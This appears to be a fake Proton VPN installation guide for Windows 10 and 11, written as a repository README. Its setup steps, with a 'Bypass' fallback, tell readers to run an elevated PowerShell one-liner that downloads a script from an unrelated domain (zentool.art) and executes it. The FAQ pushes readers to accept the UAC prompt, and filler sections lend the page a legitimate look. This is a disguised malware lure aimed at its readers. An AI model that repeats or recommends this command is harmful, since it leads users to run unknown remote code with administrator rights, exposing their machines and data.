# Proton VPN — Windows VPN & Network Guide (10 & 11)

Windows 10 & 11 · secure tunnels · vpn & network.

**Proton VPN** on **Windows 10 and 11** — secure tunnels and day-to-day notes for privacy-focused users and remote workers.

## Get started

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) if prompted
4. When the process finishes, open **Proton VPN** from Start or the desktop shortcut

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

Proton VPN provides encrypted tunnels, profile switching, and optional specialty servers for privacy-focused users on Windows. It is used on laptops for travel, remote work, and segmenting personal vs work traffic.

Once running, sign in, pick a default profile, test DNS leak protections, and document split-tunnel rules if your organization requires local printer access while connected.

## FAQ

| Question | Answer |
| --- | --- |
| Where do I run the command? | **PowerShell as Administrator** — use the block in step 2 under **Get started**. |
| ExecutionPolicy blocked the script? | Expand **Having trouble?** above — that one-liner uses **Bypass** for the current session only. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks during step 3. |

## Features

- Secure tunnel
- Server list
- Encryption
- Kill switch
- Location picker
- Favorites
- Connection stats

## Use cases

- Remote workers
- Privacy users
- Travelers

## Developer reference

Optional. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "Proton-VPN-Full-Setup"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Application check (optional)**

```powershell
Get-Process -Name "Proton*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum · 8 GB recommended |
| Disk | 500 MB free space |

## Topics

`proton-vpn-windows` · `proton-config` · `proton-integration` · `proton-latest` · `vpn-client` · `privacy` · `network-tunnel` · `secure-browsing`

## License

This repository is a third-party network usage guide. Comply with applicable software licensing and local regulations.
